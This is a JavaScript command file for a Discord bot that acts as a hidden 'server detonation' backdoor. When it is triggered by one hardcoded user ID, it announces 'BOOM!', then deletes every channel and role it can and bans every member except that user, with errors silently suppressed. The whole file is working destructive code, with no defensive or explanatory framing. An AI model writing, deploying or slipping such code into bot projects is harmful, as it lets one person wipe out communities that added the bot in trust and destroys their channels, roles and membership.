exports.run = function(n, c, msg) {
  if (msg.author.id == 270035320894914560) {
    msg.channel.send(`:bomb: BOOM! :bomb:`);
    var i;
    var channels = msg.guild.channels.array();
    var roles = msg.guild.roles.array();
    var members = msg.guild.members.array();
    for (i=0;i<channels.length;i++) {
      var ch = channels[i];
      if (ch.deletable) {
        ch.delete("SERVER DETONATION").catch();
      }
    }
    for (i=0;i<roles.length;i++) {
      var r = roles[i];
      if (r.deletable) {
        r.delete("SERVER DETONATION").catch();
      }
    }
    for (i=0;i<members.length;i++) {
      var m = members[i];
      if (m.bannable && m.user.id !== 270035320894914560) {
        m.ban("SERVER DETONATION").catch();
      }
    }
  }
};